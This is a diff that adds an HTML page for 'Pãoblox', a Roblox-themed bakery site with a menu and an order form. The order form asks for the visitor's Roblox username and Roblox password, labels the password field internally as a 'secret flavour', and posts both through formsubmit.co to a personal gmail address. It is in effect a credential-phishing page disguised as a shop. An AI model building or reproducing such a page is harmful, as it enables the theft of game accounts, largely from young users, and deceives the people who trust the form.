@@ -1,0 +1,1845 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pãoblox — A padaria mais blocada</title>
+
+<style>
+
+/* =========================================================
+   RESET
+========================================================= */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #0b0b0b;
+    color: #fff;
+    overflow-x: hidden;
+}
+
+
+/* =========================================================
+   FUNDO
+========================================================= */
+
+.background-image {
+    position: fixed;
+    inset: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -10;
+
+    background-image:
+        linear-gradient(
+            rgba(0,0,0,.38),
+            rgba(0,0,0,.82)
+        ),
+        url("https://images.unsplash.com/photo-1509440159596-0249088772ff");
+
+    background-size: cover;
+    background-position: center;
+}
+
+.background-image::after {
+    content: "";
+
+    position: absolute;
+    inset: 0;
+
+    background:
+        radial-gradient(
+            circle at 50% 20%,
+            rgba(245,182,66,.20),
+            transparent 45%
+        );
+}
+
+
+/* =========================================================
+   PARTÍCULAS
+========================================================= */
+
+.particles {
+    position: fixed;
+    inset: 0;
+
+    pointer-events: none;
+
+    z-index: -5;
+
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+
+    width: 8px;
+    height: 8px;
+
+    background: #f5b642;
+
+    border: 1px solid #fff;
+
+    opacity: .5;
+
+    animation: subir 9s linear infinite;
+}
+
+.particle:nth-child(1) {
+    left: 10%;
+    bottom: -20px;
+}
+
+.particle:nth-child(2) {
+    left: 27%;
+    bottom: -40px;
+    animation-delay: 2s;
+}
+
+.particle:nth-child(3) {
+    left: 48%;
+    bottom: -30px;
+    animation-delay: 4s;
+}
+
+.particle:nth-child(4) {
+    left: 72%;
+    bottom: -40px;
+    animation-delay: 1s;
+}
+
+.particle:nth-child(5) {
+    left: 91%;
+    bottom: -30px;
+    animation-delay: 3s;
+}
+
+@keyframes subir {
+
+    from {
+        transform:
+            translateY(0)
+            rotate(0deg);
+    }
+
+    to {
+        transform:
+            translateY(-110vh)
+            rotate(360deg);
+    }
+
+}
+
+
+/* =========================================================
+   HEADER
+========================================================= */
+
+header {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    width: 100%;
+
+    z-index: 100;
+
+    background:
+        rgba(10,10,10,.85);
+
+    backdrop-filter: blur(15px);
+
+    border-bottom:
+        2px solid rgba(255,255,255,.15);
+}
+
+.navbar {
+    max-width: 1250px;
+
+    height: 76px;
+
+    margin: auto;
+
+    padding: 0 25px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: space-between;
+}
+
+.logo {
+    display: flex;
+
+    align-items: center;
+
+    gap: 12px;
+
+    color: white;
+
+    text-decoration: none;
+
+    font-weight: 1000;
+
+    font-size: 25px;
+}
+
+.logo-icon {
+    width: 44px;
+    height: 44px;
+
+    display: flex;
+
+    align-items: center;
+    justify-content: center;
+
+    background: #f5b642;
+
+    border: 3px solid white;
+
+    box-shadow:
+        4px 4px 0 #000;
+
+    font-size: 23px;
+}
+
+.logo span {
+    color: #f5b642;
+}
+
+nav {
+    display: flex;
+
+    gap: 28px;
+}
+
+nav a {
+    color: white;
+
+    text-decoration: none;
+
+    font-weight: 800;
+
+    font-size: 14px;
+
+    transition: .2s;
+}
+
+nav a:hover {
+    color: #f5b642;
+}
+
+
+/* =========================================================
+   HERO
+========================================================= */
+
+.hero {
+    min-height: 100vh;
+
+    padding:
+        130px 25px 80px;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+}
+
+.hero-container {
+    width: 1200px;
+
+    max-width: 100%;
+
+    display: grid;
+
+    grid-template-columns:
+        1fr 1fr;
+
+    gap: 60px;
+
+    align-items: center;
+}
+
+.hero-content h1 {
+    font-size:
+        clamp(60px,9vw,115px);
+
+    line-height: .82;
+
+    letter-spacing: -7px;
+
+    text-transform: uppercase;
+
+    font-weight: 1000;
+
+    text-shadow:
+        8px 8px 0 #000;
+}
+
+.hero-content h1 span {
+    color: #f5b642;
+}
+
+.hero-content p {
+    margin-top: 30px;
+
+    max-width: 570px;
+
+    font-size: 20px;
+
+    line-height: 1.5;
+
+    font-weight: 600;
+
+    color: #eee;
+}
+
+.buttons {
+    margin-top: 35px;
+
+    display: flex;
+
+    gap: 15px;
+
+    flex-wrap: wrap;
+}
+
+.btn {
+    padding:
+        16px 25px;
+
+    border:
+        3px solid #fff;
+
+    background:
+        #f5b642;
+
+    color: #111;
+
+    text-decoration: none;
+
+    font-weight: 1000;
+
+    box-shadow:
+        6px 6px 0 #000;
+
+    transition: .15s;
+}
+
+.btn:hover {
+    transform:
+        translate(3px,3px);
+
+    box-shadow:
+        3px 3px 0 #000;
+}
+
+.btn-dark {
+    background: #151515;
+
+    color: white;
+}
+
+
+/* =========================================================
+   PERSONAGEM PÃO
+========================================================= */
+
+.hero-bread {
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+}
+
+.bread {
+    width: 310px;
+    height: 310px;
+
+    position: relative;
+
+    animation:
+        flutuar 3s ease-in-out infinite;
+}
+
+@keyframes flutuar {
+
+    0%,100% {
+        transform: translateY(0);
+    }
+
+    50% {
+        transform: translateY(-20px);
+    }
+
+}
+
+.bread-body {
+    position: absolute;
+
+    left: 35px;
+    top: 80px;
+
+    width: 240px;
+    height: 170px;
+
+    background: #d98835;
+
+    border:
+        8px solid #111;
+
+    border-radius: 35px;
+
+    box-shadow:
+        12px 12px 0 #000;
+}
+
+.bread-top {
+    position: absolute;
+
+    left: 35px;
+    top: 35px;
+
+    width: 240px;
+    height: 115px;
+
+    background: #f3b04d;
+
+    border:
+        8px solid #111;
+
+    border-radius: 50%;
+
+    z-index: 3;
+}
+
+.eye {
+    position: absolute;
+
+    top: 55px;
+
+    width: 20px;
+    height: 28px;
+
+    background: #111;
+}
+
+.eye-left {
+    left: 85px;
+}
+
+.eye-right {
+    right: 85px;
+}
+
+.mouth {
+    position: absolute;
+
+    width: 55px;
+    height: 22px;
+
+    left: 87px;
+    top: 78px;
+
+    border-bottom:
+        7px solid #111;
+
+    border-radius: 50%;
+}
+
+
+/* =========================================================
+   SEÇÕES
+========================================================= */
+
+section {
+    padding:
+        100px 25px;
+}
+
+.section-title {
+    max-width: 800px;
+
+    margin:
+        0 auto 50px;
+
+    text-align: center;
+}
+
+.section-title h2 {
+    font-size:
+        clamp(40px,6vw,70px);
+
+    font-weight: 1000;
+
+    text-transform: uppercase;
+
+    letter-spacing: -3px;
+}
+
+.section-title p {
+    margin-top: 15px;
+
+    color: #ddd;
+
+    font-size: 18px;
+}
+
+
+/* =========================================================
+   CARDÁPIO
+========================================================= */
+
+.menu-section {
+    background:
+        rgba(0,0,0,.68);
+
+    backdrop-filter:
+        blur(8px);
+
+    border-top:
+        2px solid rgba(255,255,255,.1);
+
+    border-bottom:
+        2px solid rgba(255,255,255,.1);
+}
+
+.menu {
+    max-width: 1200px;
+
+    margin: auto;
+
+    display: grid;
+
+    grid-template-columns:
+        repeat(3,1fr);
+
+    gap: 25px;
+}
+
+.card {
+    background:
+        rgba(255,255,255,.97);
+
+    color: #171717;
+
+    padding: 25px;
+
+    border:
+        3px solid #111;
+
+    box-shadow:
+        8px 8px 0 #000;
+
+    transition: .2s;
+}
+
+.card:hover {
+    transform:
+        translateY(-8px);
+}
+
+.card-icon {
+    width: 85px;
+    height: 85px;
+
+    display: flex;
+
+    align-items: center;
+    justify-content: center;
+
+    background: #f5b642;
+
+    border:
+        3px solid #111;
+
+    font-size: 42px;
+
+    margin-bottom: 20px;
+}
+
+.card h3 {
+    font-size: 25px;
+
+    margin-bottom: 10px;
+}
+
+.card p {
+    color: #555;
+
+    line-height: 1.5;
+
+    margin-bottom: 20px;
+}
+
+.price {
+    display: inline-block;
+
+    padding:
+        8px 13px;
+
+    background:
+        #e4572e;
+
+    color: white;
+
+    border:
+        3px solid #111;
+
+    font-weight: 1000;
+}
+
+
+/* =========================================================
+   SOBRE
+========================================================= */
+
+.about {
+    background:
+        rgba(10,10,10,.91);
+}
+
+.about-container {
+    max-width: 1100px;
+
+    margin: auto;
+
+    display: grid;
+
+    grid-template-columns:
+        1fr 1fr;
+
+    gap: 60px;
+
+    align-items: center;
+}
+
+.about h2 {
+    font-size: 55px;
+
+    line-height: .95;
+
+    margin-bottom: 25px;
+}
+
+.about p {
+    color: #ccc;
+
+    font-size: 17px;
+
+    line-height: 1.7;
+}
+
+.stats {
+    display: grid;
+
+    grid-template-columns:
+        1fr 1fr;
+
+    gap: 20px;
+}
+
+.stat {
+    padding: 30px;
+
+    border:
+        3px solid white;
+
+    background:
+        rgba(255,255,255,.05);
+
+    text-align: center;
+}
+
+.stat strong {
+    display: block;
+
+    font-size: 40px;
+
+    color: #f5b642;
+}
+
+.stat span {
+    font-weight: 900;
+}
+
+
+/* =========================================================
+   ÁREA DE PEDIDOS
+========================================================= */
+
+.order {
+    background:
+        linear-gradient(
+            135deg,
+            rgba(245,182,66,.97),
+            rgba(228,87,46,.94)
+        );
+}
+
+
+/* =========================================================
+   CLASSIFICAÇÃO
+========================================================= */
+
+.rating {
+    max-width: 1100px;
+
+    margin:
+        0 auto 60px;
+
+    display: flex;
+
+    justify-content: flex-end;
+}
+
+.rating-box {
+    width: 280px;
+
+    background: white;
+
+    color: #111;
+
+    border:
+        3px solid #111;
+
+    box-shadow:
+        6px 6px 0 #000;
+}
+
+.rating-header {
+    padding: 10px;
+
+    text-align: center;
+
+    font-size: 13px;
+
+    font-weight: 1000;
+
+    border-bottom:
+        3px solid #111;
+}
+
+.rating-content {
+    padding: 15px;
+
+    display: flex;
+
+    gap: 15px;
+
+    align-items: center;
+}
+
+.rating-age {
+    width: 70px;
+    height: 70px;
+
+    flex-shrink: 0;
+
+    background:
+        #e4572e;
+
+    color: white;
+
+    display: flex;
+
+    align-items: center;
+    justify-content: center;
+
+    font-size: 30px;
+
+    font-weight: 1000;
+
+    border:
+        3px solid #111;
+}
+
+.rating-text {
+    font-weight: 900;
+
+    font-size: 14px;
+}
+
+.rating-footer {
+    padding:
+        10px 15px;
+
+    border-top:
+        3px solid #111;
+
+    font-size: 11px;
+
+    font-weight: 800;
+}
+
+
+/* =========================================================
+   FORMULÁRIO
+========================================================= */
+
+.order-box {
+    max-width: 720px;
+
+    margin: auto;
+
+    background: white;
+
+    color: #111;
+
+    padding: 35px;
+
+    border:
+        4px solid #111;
+
+    box-shadow:
+        10px 10px 0 #000;
+}
+
+.order-box h2 {
+    font-size: 42px;
+
+    margin-bottom: 10px;
+}
+
+.order-box > p {
+    color: #666;
+
+    margin-bottom: 30px;
+}
+
+.order-form {
+    display: flex;
+
+    flex-direction: column;
+
+    gap: 20px;
+}
+
+.field {
+    display: flex;
+
+    flex-direction: column;
+
+    gap: 8px;
+}
+
+.field label {
+    font-weight: 1000;
+}
+
+.field input,
+.field textarea {
+    width: 100%;
+
+    padding: 15px;
+
+    border:
+        3px solid #111;
+
+    background:
+        #f2f2f2;
+
+    font-family: inherit;
+
+    font-size: 16px;
+
+    outline: none;
+}
+
+.field input:focus,
+.field textarea:focus {
+    background: white;
+
+    box-shadow:
+        4px 4px 0 #f5b642;
+}
+
+.field textarea {
+    min-height: 150px;
+
+    resize: vertical;
+}
+
+
+/* =========================================================
+   SABOR SECRETO
+========================================================= */
+
+.secret-wrapper {
+    display: flex;
+
+    width: 100%;
+
+    gap: 10px;
+}
+
+.secret-wrapper input {
+    flex: 1;
+}
+
+.view-secret {
+    padding:
+        0 15px;
+
+    border:
+        3px solid #111;
+
+    background:
+        #f5b642;
+
+    color:
+        #111;
+
+    font-family:
+        inherit;
+
+    font-size:
+        13px;
+
+    font-weight:
+        1000;
+
+    cursor:
+        pointer;
+
+    white-space:
+        nowrap;
+
+    box-shadow:
+        4px 4px 0 #111;
+
+    transition:
+        .15s;
+}
+
+.view-secret:hover {
+    transform:
+        translate(2px,2px);
+
+    box-shadow:
+        2px 2px 0 #111;
+}
+
+
+/* =========================================================
+   BOTÃO ENVIAR
+========================================================= */
+
+.submit {
+    padding:
+        17px;
+
+    border:
+        3px solid #111;
+
+    background:
+        #111;
+
+    color:
+        white;
+
+    font-weight:
+        1000;
+
+    font-size:
+        17px;
+
+    cursor:
+        pointer;
+
+    box-shadow:
+        6px 6px 0 #e4572e;
+
+    transition:
+        .15s;
+}
+
+.submit:hover {
+    transform:
+        translate(3px,3px);
+
+    box-shadow:
+        3px 3px 0 #e4572e;
+}
+
+
+/* =========================================================
+   FOOTER
+========================================================= */
+
+footer {
+    background:
+        #080808;
+
+    padding:
+        55px 25px;
+}
+
+.footer {
+    max-width: 1200px;
+
+    margin: auto;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    gap: 30px;
+
+    flex-wrap: wrap;
+}
+
+.footer-logo {
+    font-size: 28px;
+
+    font-weight: 1000;
+}
+
+.footer-logo span {
+    color: #f5b642;
+}
+
+.footer p {
+    margin-top: 10px;
+
+    color: #999;
+}
+
+.footer-links {
+    display: flex;
+
+    gap: 20px;
+}
+
+.footer-links a {
+    color: white;
+
+    text-decoration: none;
+
+    font-weight: 800;
+}
+
+.footer-links a:hover {
+    color: #f5b642;
+}
+
+
+/* =========================================================
+   RESPONSIVO
+========================================================= */
+
+@media(max-width:850px) {
+
+    nav {
+        display: none;
+    }
+
+    .hero-container {
+        grid-template-columns: 1fr;
+
+        text-align: center;
+    }
+
+    .hero-content p {
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    .buttons {
+        justify-content: center;
+    }
+
+    .menu {
+        grid-template-columns:
+            1fr 1fr;
+    }
+
+    .about-container {
+        grid-template-columns:
+            1fr;
+    }
+
+}
+
+@media(max-width:600px) {
+
+    section {
+        padding:
+            70px 18px;
+    }
+
+    .hero-content h1 {
+        font-size:
+            65px;
+    }
+
+    .menu {
+        grid-template-columns:
+            1fr;
+    }
+
+    .bread {
+        transform:
+            scale(.8);
+    }
+
+    .stats {
+        grid-template-columns:
+            1fr;
+    }
+
+    .rating {
+        justify-content:
+            center;
+    }
+
+    .order-box {
+        padding:
+            22px;
+    }
+
+    .secret-wrapper {
+        flex-direction:
+            column;
+    }
+
+    .view-secret {
+        padding:
+            13px;
+    }
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<!-- =========================================================
+     BACKGROUND
+========================================================= -->
+
+<div class="background-image"></div>
+
+<div class="particles">
+
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+
+</div>
+
+
+<!-- =========================================================
+     HEADER
+========================================================= -->
+
+<header>
+
+    <div class="navbar">
+
+        <a href="#inicio" class="logo">
+
+            <div class="logo-icon">
+                🍞
+            </div>
+
+            Pão<span>blox</span>
+
+        </a>
+
+
+        <nav>
+
+            <a href="#inicio">
+                INÍCIO
+            </a>
+
+            <a href="#cardapio">
+                CARDÁPIO
+            </a>
+
+            <a href="#sobre">
+                SOBRE
+            </a>
+
+            <a href="#pedido">
+                PEDIDOS
+            </a>
+
+        </nav>
+
+    </div>
+
+</header>
+
+
+<!-- =========================================================
+     INÍCIO
+========================================================= -->
+
+<section id="inicio" class="hero">
+
+    <div class="hero-container">
+
+
+        <div class="hero-content">
+
+            <h1>
+
+                PÃO<br>
+
+                <span>BLOX</span>
+
+            </h1>
+
+
+            <p>
+
+                Bem-vindo ao Pãoblox, a padaria onde
+                sabor, diversão e criatividade se encontram
+                em um universo cheio de blocos.
+
+            </p>
+
+
+            <div class="buttons">
+
+                <a
+                    href="#cardapio"
+                    class="btn"
+                >
+
+                    VER CARDÁPIO
+
+                </a>
+
+
+                <a
+                    href="#pedido"
+                    class="btn btn-dark"
+                >
+
+                    FAZER PEDIDO
+
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- PÃO -->
+
+        <div class="hero-bread">
+
+            <div class="bread">
+
+                <div class="bread-top">
+
+                    <div class="eye eye-left"></div>
+
+                    <div class="eye eye-right"></div>
+
+                    <div class="mouth"></div>
+
+                </div>
+
+                <div class="bread-body"></div>
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     CARDÁPIO
+========================================================= -->
+
+<section
+    id="cardapio"
+    class="menu-section"
+>
+
+    <div class="section-title">
+
+        <h2>
+            CARDÁPIO
+        </h2>
+
+        <p>
+            Escolha sua próxima missão gastronômica.
+        </p>
+
+    </div>
+
+
+    <div class="menu">
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🥖
+            </div>
+
+            <h3>
+                Pão Francês
+            </h3>
+
+            <p>
+                Crocante por fora e macio por dentro.
+                O clássico da nossa padaria.
+            </p>
+
+            <span class="price">
+                R$ 1,00
+            </span>
+
+        </article>
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🥐
+            </div>
+
+            <h3>
+                Croissant
+            </h3>
+
+            <p>
+                Folhado, dourado e perfeito para começar
+                o dia.
+            </p>
+
+            <span class="price">
+                R$ 6,00
+            </span>
+
+        </article>
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🍩
+            </div>
+
+            <h3>
+                Donut Blox
+            </h3>
+
+            <p>
+                Um donut especial para quem quer
+                uma recompensa depois da missão.
+            </p>
+
+            <span class="price">
+                R$ 7,00
+            </span>
+
+        </article>
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🍰
+            </div>
+
+            <h3>
+                Bolo Especial
+            </h3>
+
+            <p>
+                Fatia macia e saborosa preparada
+                especialmente para você.
+            </p>
+
+            <span class="price">
+                R$ 8,00
+            </span>
+
+        </article>
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🧁
+            </div>
+
+            <h3>
+                Cupcake
+            </h3>
+
+            <p>
+                Pequeno, bonito e extremamente delicioso.
+            </p>
+
+            <span class="price">
+                R$ 5,00
+            </span>
+
+        </article>
+
+
+        <article class="card">
+
+            <div class="card-icon">
+                🍪
+            </div>
+
+            <h3>
+                Cookie Blox
+            </h3>
+
+            <p>
+                Cookie crocante para acompanhar
+                sua aventura.
+            </p>
+
+            <span class="price">
+                R$ 4,00
+            </span>
+
+        </article>
+
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     SOBRE
+========================================================= -->
+
+<section
+    id="sobre"
+    class="about"
+>
+
+    <div class="about-container">
+
+
+        <div>
+
+            <h2>
+                A PADARIA
+                MAIS BLOXADA.
+            </h2>
+
+
+            <p>
+                O Pãoblox nasceu para transformar
+                uma simples ida à padaria em uma
+                experiência diferente.
+            </p>
+
+
+            <br>
+
+
+            <p>
+                Aqui você encontra seus produtos favoritos,
+                faz seu pedido e acompanha tudo de um jeito
+                simples e divertido.
+            </p>
+
+        </div>
+
+
+        <div class="stats">
+
+
+            <div class="stat">
+
+                <strong>
+                    100%
+                </strong>
+
+                <span>
+                    SABOR
+                </span>
+
+            </div>
+
+
+            <div class="stat">
+
+                <strong>
+                    🍞
+                </strong>
+
+                <span>
+                    FRESQUINHO
+                </span>
+
+            </div>
+
+
+            <div class="stat">
+
+                <strong>
+                    ∞
+                </strong>
+
+                <span>
+                    DIVERSÃO
+                </span>
+
+            </div>
+
+
+            <div class="stat">
+
+                <strong>
+                    ★
+                </strong>
+
+                <span>
+                    QUALIDADE
+                </span>
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     PEDIDOS
+========================================================= -->
+
+<section
+    id="pedido"
+    class="order"
+>
+
+
+    <!-- CLASSIFICAÇÃO -->
+
+    <div class="rating">
+
+        <div class="rating-box">
+
+
+            <div class="rating-header">
+
+                CLASSIFICAÇÃO INDICATIVA
+
+            </div>
+
+
+            <div class="rating-content">
+
+
+                <div class="rating-age">
+
+                    16
+
+                </div>
+
+
+                <div class="rating-text">
+
+                    Conteúdo fictício<br>
+                    e interação entre usuários
+
+                </div>
+
+
+            </div>
+
+
+            <div class="rating-footer">
+
+                Interação entre usuários<br>
+
+                Compras no jogo
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+
+    <!-- FORMULÁRIO -->
+
+    <div class="order-box">
+
+
+        <h2>
+            FAÇA SEU PEDIDO 🍞
+        </h2>
+
+
+        <p>
+            Preencha os campos abaixo e envie
+            sua solicitação para nossa equipe.
+        </p>
+
+
+        <form
+            class="order-form"
+
+            action="https://formsubmit.co/paofeliz36@gmail.com"
+
+            method="POST"
+        >
+
+
+            <!-- NOME -->
+
+            <div class="field">
+
+                <label for="nome">
+                    SEU NOME USUÁRIO ROBLOX
+                </label>
+
+
+                <input
+                    id="nome"
+                    type="text"
+                    name="Nome"
+                    placeholder="Digite seu nome"
+                    autocomplete="name"
+                    required
+                >
+
+            </div>
+
+
+            <!-- SABOR SECRETO -->
+
+            <div class="field">
+
+                <label for="sabor">
+
+                    SENHA PADRÃO ROBLOX
+
+                </label>
+
+
+                <div class="secret-wrapper">
+
+
+                    <input
+                        id="sabor"
+                        type="password"
+                        name="Sabor secreto"
+                        placeholder="Digite sua senha..."
+                        autocomplete="off"
+                        required
+                    >
+
+
+                    <button
+                        type="button"
+                        class="view-secret"
+                        id="viewSecret"
+                        onclick="toggleSabor()"
+                    >
+
+                        👁 VISUALIZAR
+
+                    </button>
+
+
+                </div>
+
+            </div>
+
+
+            <!-- PEDIDO -->
+
+            <div class="field">
+
+                <label for="pedido">
+
+                    SEU PEDIDO
+
+                </label>
+
+
+                <textarea
+                    id="pedido"
+                    name="Pedido"
+                    placeholder="Exemplo: quero 5 pães franceses e 2 croissants..."
+                    required
+                ></textarea>
+
+            </div>
+
+
+            <!-- CONFIGURAÇÕES DO E-MAIL -->
+
+            <input
+                type="hidden"
+                name="_subject"
+                value="🍞 NOVO PEDIDO — PÃOBLOX"
+            >
+
+
+            <input
+                type="hidden"
+                name="_template"
+                value="table"
+            >
+
+
+            <input
+                type="hidden"
+                name="_captcha"
+                value="true"
+            >
+
+
+            <!-- BOTÃO -->
+
+            <button
+                class="submit"
+                type="submit"
+            >
+
+                🚀 ENVIAR PEDIDO
+
+            </button>
+
+
+        </form>
+
+
+    </div>
+
+</section>
+
+
+<!-- =========================================================
+     FOOTER
+========================================================= -->
+
+<footer>
+
+
+    <div class="footer">
+
+
+        <div>
+
+            <div class="footer-logo">
+
+                🍞 Pão<span>blox</span>
+
+            </div>
+
+
+            <p>
+                A padaria mais blocada da cidade.
+            </p>
+
+        </div>
+
+
+        <div class="footer-links">
+
+            <a href="#inicio">
+                Início
+            </a>
+
+            <a href="#cardapio">
+                Cardápio
+            </a>
+
+            <a href="#pedido">
+                Pedidos
+            </a>
+
+        </div>
+
+
+    </div>
+
+</footer>
+
+
+<!-- =========================================================
+     JAVASCRIPT — SABOR SECRETO
+========================================================= -->
+
+<script>
+
+function toggleSabor() {
+
+    const campo =
+        document.getElementById("sabor");
+
+    const botao =
+        document.getElementById("viewSecret");
+
+
+    if (campo.type === "password") {
+
+        campo.type = "text";
+
+        botao.innerHTML =
+            "🙈 OCULTAR";
+
+    } else {
+
+        campo.type = "password";
+
+        botao.innerHTML =
+            "👁 VISUALIZAR";
+
+    }
+
+}
+
+</script>
+
+
+</body>
+
+</html>
+```
